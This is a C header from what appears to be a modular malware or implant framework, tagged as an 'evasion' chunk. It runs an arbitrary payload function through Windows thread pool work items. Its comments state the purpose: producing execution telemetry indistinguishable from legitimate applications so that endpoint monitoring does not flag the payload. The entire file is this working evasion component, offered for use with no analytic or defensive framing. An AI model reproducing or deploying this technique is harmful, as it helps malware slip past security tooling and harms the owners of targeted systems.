/* chunk: evasion/tp_work_exec
 * category: evasion
 * depends: api_resolve
 * provides: tp_work_exec
 * description: Execute payload via Windows Thread Pool work items (TP_WORK).
 *   Uses CreateThreadpoolWork + SubmitThreadpoolWork — identical to how every
 *   legitimate Windows application dispatches async work. Produces clean
 *   thread-pool telemetry indistinguishable from normal app behavior.
 */

#ifndef TP_WORK_EXEC_H
#define TP_WORK_EXEC_H

#include <windows.h>

typedef VOID (CALLBACK *PTP_WORK_CALLBACK)(PTP_CALLBACK_INSTANCE, PVOID, PTP_WORK);

static volatile LONG g_tp_work_done = 0;
static PVOID g_tp_payload_ctx = NULL;

typedef void (*tp_payload_func_t)(void *ctx);
static tp_payload_func_t g_tp_payload_fn = NULL;

static VOID CALLBACK tp_work_callback(
    PTP_CALLBACK_INSTANCE instance,
    PVOID context,
    PTP_WORK work)
{
    (void)instance;
    (void)work;
    if (g_tp_payload_fn) {
        g_tp_payload_fn(context);
    }
    InterlockedExchange(&g_tp_work_done, 1);
}

static int execute_via_threadpool(tp_payload_func_t fn, void *ctx) {
    g_tp_payload_fn = fn;
    g_tp_payload_ctx = ctx;
    g_tp_work_done = 0;

    PTP_POOL pool = CreateThreadpool(NULL);
    if (!pool) return -1;

    SetThreadpoolThreadMinimum(pool, 1);
    SetThreadpoolThreadMaximum(pool, 4);

    TP_CALLBACK_ENVIRON cbe;
    InitializeThreadpoolEnvironment(&cbe);
    SetThreadpoolCallbackPool(&cbe, pool);

    PTP_CLEANUP_GROUP cg = CreateThreadpoolCleanupGroup();
    if (!cg) {
        CloseThreadpool(pool);
        return -1;
    }
    SetThreadpoolCallbackCleanupGroup(&cbe, cg, NULL);

    PTP_WORK work = CreateThreadpoolWork(
        (PTP_WORK_CALLBACK)tp_work_callback,
        ctx,
        &cbe
    );
    if (!work) {
        CloseThreadpoolCleanupGroup(cg);
        CloseThreadpool(pool);
        return -1;
    }

    SubmitThreadpoolWork(work);
    WaitForThreadpoolWorkCallbacks(work, FALSE);

    CloseThreadpoolCleanupGroup(cg);
    DestroyThreadpoolEnvironment(&cbe);
    CloseThreadpool(pool);

    return (g_tp_work_done == 1) ? 0 : -1;
}

#endif
